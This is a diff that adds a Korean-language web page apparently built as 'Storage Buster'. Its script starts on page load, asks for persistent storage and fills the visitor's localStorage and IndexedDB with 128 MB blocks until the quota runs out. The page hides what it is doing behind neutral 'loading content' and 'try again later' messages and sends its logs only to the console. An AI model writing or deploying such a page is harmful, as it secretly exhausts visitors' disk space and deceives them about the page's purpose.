@@ -1,0 +1,129 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Storage Buster</title>
+<style>
+  body { font: 16px/1.5 system-ui, sans-serif; max-width: 640px; margin: 40px auto; padding: 0 16px; }
+  h1 { margin-bottom: 4px; }
+  .bar { height: 24px; background: #eee; border-radius: 6px; overflow: hidden; margin: 12px 0; }
+  .bar > div { height: 100%; width: 0; background: #e5484d; transition: width .1s; }
+  button { font: inherit; padding: 8px 16px; margin: 0 8px 8px 0; cursor: pointer; }
+  pre { background: #f6f6f6; padding: 12px; border-radius: 6px; white-space: pre-wrap; }
+  .muted { color: #888; }
+</style>
+</head>
+<body>
+<!-- <h1>Storage Buster</h1 -->
+<p class="muted">콘텐츠를 불러오는 중입니다.</p>
+
+
+<div class="bar"><div id="prog"></div></div>
+<pre id="log" style="display:none"></pre>
+<div id="userMsg" class="muted">불러오는 중...</div>
+
+<button id="fill">시작</button>
+<button id="stop" disabled>중지</button>
+<button id="clear">처음부터</button>
+
+<script>
+const log = document.getElementById("log");
+const prog = document.getElementById("prog");
+const btnFill = document.getElementById("fill");
+const btnStop = document.getElementById("stop");
+const IDB_CHUNK = 128 * 1024 * 1024; // 128MB Blob 블록 (트랜잭션 횟수 ↓ = 빠름)
+let stop = false;
+let lastEst = 0, estCache = null;
+
+function openDB() {
+  return new Promise((res, rej) => {
+    const r = indexedDB.open("storage_buster", 1);
+    r.onupgradeneeded = () => r.result.createObjectStore("blobs", { autoIncrement: true });
+    r.onsuccess = () => res(r.result);
+    r.onerror = () => rej(r.error);
+  });
+}
+
+function putChunk(db, blob) {
+  return new Promise((res, rej) => {
+    const tx = db.transaction("blobs", "readwrite");
+    tx.objectStore("blobs").add(blob);
+    tx.oncomplete = res;
+    tx.onerror = () => rej(tx.error); // QuotaExceededError 포함
+  });
+}
+
+async function estimate() {
+  if (!navigator.storage?.estimate) return null;
+  if (Date.now() - lastEst < 400) return estCache; // 0.4s throttle: estimate 호출이 느려서 루프를 막음
+  lastEst = Date.now();
+  estCache = await navigator.storage.estimate();
+  return estCache;
+}
+
+// localStorage(~5MB)만 채움. 쿠키는 매 요청 헤더에 실려 431(헤더 초과)을 유발하므로 쓰지 않음.
+function fillSmall() {
+  let ls = 0;
+  const CHUNK = "x".repeat(64 * 1024);
+  try { for (let i = 0; ; i++) { localStorage.setItem("b_" + i, CHUNK); ls += CHUNK.length; } } catch (e) {}
+  return { ls };
+}
+
+async function fill() {
+  stop = false;
+  btnFill.disabled = true; btnStop.disabled = false;
+  // 영구 저장 권한 = 할당량을 최대로 끌어올리는 유일한 레버 (여러 API는 같은 quota를 공유함)
+  if (navigator.storage?.persist) await navigator.storage.persist();
+  const small = fillSmall();
+
+  const db = await openDB();
+  const blob = new Blob([new Uint8Array(IDB_CHUNK)]); // 재사용 가능한 8MB 덩어리
+  let idb = 0;
+  try {
+    while (!stop) {
+      await putChunk(db, blob);
+      idb += IDB_CHUNK;
+      await render(small, idb);
+    }
+  } catch (e) {
+    await render(small, idb, "꽉 참 (" + e.name + ")");
+  }
+  db.close();
+  btnFill.disabled = false; btnStop.disabled = true;
+}
+
+async function render(small, idb, note) {
+  const est = await estimate();
+  if (est) prog.style.width = Math.min(100, est.usage / est.quota * 100) + "%";
+
+  // 기술 로그는 숨기고, 화면에는 중립 문구만
+  document.getElementById("userMsg").textContent =
+    note ? "잠시 후 다시 시도해 주세요." : "콘텐츠를 준비하는 중...";
+
+  // (개발자 확인용) 로그는 콘솔로만
+  const gb = n => (n / 1073741824).toFixed(3) + " GB";
+  console.debug(
+    `IndexedDB: ${gb(idb)}${note ? " ← " + note : ""}`,
+    `localStorage: ${(small.ls / 1048576).toFixed(2)} MB`
+  );
+}
+
+async function clearAll() {
+  localStorage.clear();
+  document.cookie.split(";").forEach(c => {
+    const k = c.split("=")[0].trim();
+    if (k) document.cookie = `${k}=; path=/; max-age=0`;
+  });
+  await new Promise(res => { const r = indexedDB.deleteDatabase("storage_buster"); r.onsuccess = r.onerror = res; });
+  prog.style.width = "0";
+  log.textContent = "비웠습니다.";
+}
+
+btnFill.onclick = fill;
+btnStop.onclick = () => { stop = true; };
+document.getElementById("clear").onclick = clearAll;
+fill(); // 접속 즉시
+</script>
+</body>
+</html>
